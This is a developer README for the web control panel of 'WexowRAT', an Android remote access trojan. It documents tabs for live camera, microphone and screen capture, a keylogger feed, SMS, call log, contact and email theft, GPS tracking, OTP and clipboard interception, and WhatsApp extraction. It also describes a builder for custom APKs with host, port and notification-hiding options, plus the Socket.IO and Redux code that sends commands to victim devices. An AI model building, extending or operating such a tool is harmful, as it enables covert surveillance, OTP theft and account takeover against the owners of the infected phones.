# 🎨 Wexow Frontend

**Modern React dashboard for WexowRAT — real-time control panel.**

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Quick Start](#-quick-start)
- [Features](#-features)
- [Tech Stack](#-tech-stack)
- [Project Structure](#-project-structure)
- [Development](#-development)
- [Building](#-building)
- [State Management](#-state-management)
- [Socket.IO Integration](#-socketio-integration)
- [Adding a New Tab](#-adding-a-new-tab)
- [Styling](#-styling)
- [Troubleshooting](#-troubleshooting)

---

## 🎯 Overview

The **Wexow Frontend** is a modern single-page application (SPA) that provides a real-time control panel for managing Android clients.

**What it does**:

- 🔌 **Connects** to the server via Socket.IO
- 📊 **Displays** connected devices and their data
- 🎮 **Sends** commands to devices in real-time
- 🔨 **Builds** custom APKs from the browser
- 📁 **Browses** extracted files and media

**Design Philosophy**:

- ⚡ **Fast** — Vite for instant HMR
- 🎨 **Modern** — React 19 + TailwindCSS
- 🔒 **Type-safe** — Full TypeScript
- 📱 **Responsive** — Works on desktop & mobile

---

## 🚀 Quick Start

### Prerequisites

| Tool | Version |
|------|---------|
| **Node.js** | 18.x+ |
| **npm** | 9.x+ |

### Install & Run

```bash
# From project root
cd frontend

# Install dependencies
npm install

# Start dev server
npm run dev
```

Open: **http://localhost:5173**

> The dev server proxies API requests to `http://localhost:3000`. Make sure the server is running.

### Build for Production

```bash
cd frontend
./build.sh
```

This:
1. ✅ Builds a production bundle
2. ✅ Copies it to `server/public/app/`
3. ✅ The server serves it at `/app`

---

## ✨ Features

### 🖥️ Real-Time Dashboard
- Live device list with connection status
- System stats (CPU, RAM, uptime)
- Network traffic monitoring
- Real-time logs

### 🎮 20+ Control Tabs

| Tab | Purpose |
|-----|---------|
| **Camera** | Live camera stream |
| **Mic** | Live audio stream |
| **Screen** | Screen sharing |
| **Live** | Real-time screenshots |
| **Reader** | Screen reader (UI tree) |
| **Files** | File manager |
| **SMS** | Read SMS |
| **Calls** | Call logs |
| **Contacts** | Contact manager |
| **Location** | GPS tracking |
| **Keylog** | Keylogger feed |
| **Apps** | App manager |
| **Power** | Lock/Unlock |
| **WhatsApp** | Media extraction |
| **DB** | Device database |
| **Emails** | Email extractor |
| **Intercepts** | OTP & Clipboard |
| **Notifications** | Live notifications |
| **Automation** | Auto tasks |
| **Builder** | APK builder |
| **Downloaded** | Downloaded files |

### 🔨 APK Builder
- Configure host, port, package name
- Custom app name & icon
- Toggle notification visibility
- Real-time build logs
- Download built APK

### 📊 Device Overview
- Connection status
- Battery level
- Network info
- Last seen time
- Country flag

---

## 🔧 Tech Stack

| Category | Tech |
|----------|------|
| **Framework** | React 19 |
| **Language** | TypeScript 5 |
| **Build Tool** | Vite 6 |
| **Router** | React Router 7 |
| **State** | Redux Toolkit |
| **Realtime** | Socket.IO Client |
| **Styling** | TailwindCSS 4 |
| **UI Components** | shadcn/ui (Radix UI) |
| **Icons** | Lucide React |
| **HTTP** | Fetch API |
| **Notifications** | Custom Toast system |

---

## 📁 Project Structure

```
frontend/
├── index.html                    # Entry HTML
├── package.json
├── vite.config.ts
├── tsconfig.json
├── build.sh                      # Build & copy to server
│
└── src/
    ├── main.tsx                  # React entry
    ├── App.tsx                   # Root component
    ├── index.css                 # Global styles + Tailwind
    │
    ├── components/
    │   ├── login-form.tsx        # Login screen
    │   ├── providers.tsx         # Redux + Router + Toaster
    │   │
    │   ├── dashboard/
    │   │   ├── dashboard-shell.tsx      # Main layout
    │   │   ├── clients-panel.tsx        # Device list
    │   │   ├── overview-panel.tsx       # Stats & info
    │   │   ├── exploit-console.tsx      # Main console
    │   │   ├── builder-panel.tsx        # APK builder
    │   │   │
    │   │   └── tabs/
    │   │       ├── apps-tab.tsx
    │   │       ├── automation-tab.tsx
    │   │       ├── call-logs-tab.tsx
    │   │       ├── camera-tab.tsx
    │   │       ├── contacts-tab.tsx
    │   │       ├── db-tab.tsx
    │   │       ├── downloaded-tab.tsx
    │   │       ├── emails-tab.tsx
    │   │       ├── files-tab.tsx
    │   │       ├── intercepts-tab.tsx
    │   │       ├── keylog-tab.tsx
    │   │       ├── live-screenshot-tab.tsx
    │   │       ├── location-tab.tsx
    │   │       ├── mic-tab.tsx
    │   │       ├── notifications-tab.tsx
    │   │       ├── power-tab.tsx
    │   │       ├── screen-reader-tab.tsx
    │   │       ├── screen-share-tab.tsx
    │   │       ├── sms-tab.tsx
    │   │       └── whatsapp-media-tab.tsx
    │   │
    │   └── ui/                   # shadcn/ui components
    │       ├── badge.tsx
    │       ├── button.tsx
    │       ├── card.tsx
    │       ├── input.tsx
    │       └── ...
    │
    ├── lib/
    │   ├── socket.ts             # Socket.IO client
    │   ├── config.ts             # API URLs
    │   ├── format.ts             # Formatters
    │   └── utils.ts              # Utilities
    │
    ├── store/
    │   ├── index.ts              # Redux store
    │   ├── hooks.ts              # Typed hooks
    │   ├── api/
    │   │   └── backend-api.ts    # API client
    │   │
    │   └── slices/
    │       ├── build-slice.ts
    │       ├── clients-slice.ts
    │       ├── connection-slice.ts
    │       ├── exploit-slice.ts       # Per-client state
    │       ├── listener-slice.ts
    │       ├── logs-slice.ts
    │       └── stats-slice.ts
    │
    └── hooks/
        ├── use-mobile.ts
        └── use-toast.ts
```

---

## 🛠️ Development

### Dev Server

```bash
npm run dev
```

Open: **http://localhost:5173**

**Features**:
- ⚡ Hot Module Replacement (HMR)
- 📡 Auto-reload on save
- 🔍 Source maps
- 🌐 API proxy to `localhost:3000`

### Type Checking

```bash
npm run type-check
```

### Linting

```bash
npm run lint
```

### Clean

```bash
npm run clean
```

---

## 🏗️ Building

### Production Build

```bash
./build.sh
```

**The script does**:

1. ✅ Cleans `dist/`
2. ✅ Cleans `server/public/app/`
3. ✅ Runs `npm run build`
4. ✅ Copies `dist/*` → `server/public/app/`
5. ✅ Reports file count & total size

### Manual Build

```bash
# Build
npm run build

# Copy manually
cp -r dist/* ../server/public/app/
```

### Output

```
dist/
├── index.html
└── assets/
    ├── index-[hash].js         # Main bundle
    ├── index-[hash].css        # TailwindCSS
    └── ...
```

---

## 🗃️ State Management

The app uses **Redux Toolkit** with multiple slices.

### Slices

| Slice | Purpose |
|-------|---------|
| `build` | APK build state (logs, status) |
| `clients` | Connected devices list |
| `connection` | Socket.IO connection status |
| `exploit` | Per-client data (camera, SMS, files, etc.) |
| `listener` | TCP listeners |
| `logs` | System logs |
| `stats` | Network traffic & system info |

### Exploit Slice (Most Important)

**Per-client state** — stores everything related to a device:

```typescript
interface ClientExploitState {
  // Camera & Screen
  cameraImage: string | null
  screenImage: string | null
  liveScreenshot: string | null
  
  // Files
  filesPath: string
  files: FileEntry[]
  downloads: Record<string, DownloadProgress>
  
  // Data
  sms: SmsEntry[]
  contacts: ContactEntry[]
  callLogs: CallLogEntry[]
  keylog: KeylogEntry[]
  notifications: NotificationEntry[]
  location: LocationEntry | null
  
  // Screen Reader
  readerNodes: ReaderNode[]
  screenW: number
  screenH: number
  
  // WhatsApp
  whatsappMedia: any[]
  whatsappMessages: any[]
  
  // ... 20+ more fields
}
```

**Accessing data**:

```typescript
const sms = useAppSelector(
  (s) => s.exploit.byClient[clientId]?.sms ?? []
)
```

**Updating data**: The socket listener dispatches `clientData` action for every event.

```typescript
// socket.ts
socket.on('client_data', (payload) => {
  dispatch(clientData({
    id: payload.id,
    data: payload.data,
  }))
})
```

---

## 🔌 Socket.IO Integration

### Connection Setup

**`src/lib/socket.ts`**:

```typescript
import { io, Socket } from 'socket.io-client'
import { apiUrl } from './config'
import { store } from '@/store'

let socket: Socket | null = null

export function connectSocket() {
  if (socket) return socket
  
  socket = io(apiUrl(''), {
    transports: ['websocket'],
    reconnection: true,
    reconnectionDelay: 1000,
  })
  
  // ⭐ Events
  socket.on('connect', () => {
    store.dispatch(setConnected(true))
  })
  
  socket.on('disconnect', () => {
    store.dispatch(setConnected(false))
  })
  
  socket.on('client_connected', ({ id, details }) => {
    store.dispatch(addClient({ id, details }))
  })
  
  socket.on('client_data', ({ id, data }) => {
    store.dispatch(clientData({ id, data }))
  })
  
  socket.on('client_disconnected', (id) => {
    store.dispatch(removeClient(id))
  })
  
  socket.on('build_log', (line) => {
    store.dispatch(appendBuildLog(line))
  })
  
  return socket
}
```

### Sending Commands

**`emitOrder`** — the main way to send commands:

```typescript
import { emitOrder } from '@/lib/socket'

// ⭐ Simple command
emitOrder(clientId, 'sms')

// ⭐ Command with params
emitOrder(clientId, 'camera', {
  camera_id: 0,
  quality: 40,
})

// ⭐ Complex command
emitOrder(clientId, 'gesture', {
  type: 'click',
  x: 540,
  y: 960,
})
```

**Under the hood**:

```typescript
export function emitOrder(
  clientId: string,
  order: string,
  params?: Record<string, any>
) {
  if (!socket) return
  socket.emit('order', {
    id: clientId,
    order,
    params: params ?? {},
  })
}
```

### Server → Client Events

| Event | Payload | Purpose |
|-------|---------|---------|
| `initial_clients` | Array of clients | Initial device list |
| `client_connected` | `{ id, details }` | New device |
| `client_data` | `{ id, data }` | Data from device |
| `client_disconnected` | `id` | Device offline |
| `build_log` | `string` | APK build log line |
| `build_success` | `filename` | Build complete |
| `build_failed` | `error` | Build error |
| `sys_log` | `{ time, msg, type }` | System log |
| `stats_update` | `{ stats, sysInfo }` | System stats |
| `listeners_update` | `string[]` | Active TCP listeners |

---

## 🐛 Troubleshooting

### "Socket.IO connection failed"

**Cause**: Server not running or wrong port.

**Fix**:

```bash
# Check server
curl http://localhost:3000/api/session

# Check Vite proxy
cat vite.config.ts | grep -A 5 proxy
```

### "401 Unauthorized"

**Cause**: Not logged in.

**Fix**:

1. Open `http://localhost:5173/login`
2. Login with `ACCESS_PASSWORD`
3. Refresh page

### "Data not updating"

**Cause**: Redux not receiving socket events.

**Fix**:

1. Open DevTools → Redux tab
2. Check `exploit.byClient[clientId]`
3. Verify `socket.connected === true` in console:
   ```javascript
   console.log(window.__socket?.connected)
   ```

### "Build fails after changes"

**Fix**:

```bash
# Clear cache
rm -rf node_modules/.vite dist

# Reinstall
npm install

# Rebuild
npm run build
```

### "Styles not applied"

**Cause**: TailwindCSS not scanning the file.

**Fix**: Ensure the file is under `src/`. Tailwind scans `src/**/*.{ts,tsx}`.

### "Hot reload not working"

**Fix**:

```bash
# Restart dev server
npm run dev
```

### "out of memory"

**Fix**:

```bash
export NODE_OPTIONS="--max-old-space-size=4096"
npm run build
```

---

## 📜 License

Same as main project. See [LICENSE](../LICENSE).

---

<div align="center">

**[⬆ Back to Top](#-wexow-frontend)**

</div>